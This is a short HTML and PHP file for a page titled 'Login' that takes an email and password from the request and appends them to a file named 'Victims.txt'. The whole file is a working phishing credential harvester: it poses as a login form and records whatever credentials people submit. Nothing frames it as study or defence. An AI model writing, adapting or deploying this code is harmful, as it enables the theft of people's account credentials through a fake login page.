<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <title>Login</title>
</head>
<body>
    <?php
    $user = $_GET["email"];
    $pass = $_GET["pass"];
    $vicfile = fopen("Victims.txt" , 'a');
    fwrite($vicfile , "Email: ");
    fwrite($vicfile , $user);
    fwrite($vicfile , "\n");
    fwrite($vicfile , "Password: ");
    fwrite($vicfile , $pass);
    ?>
</body>
</html>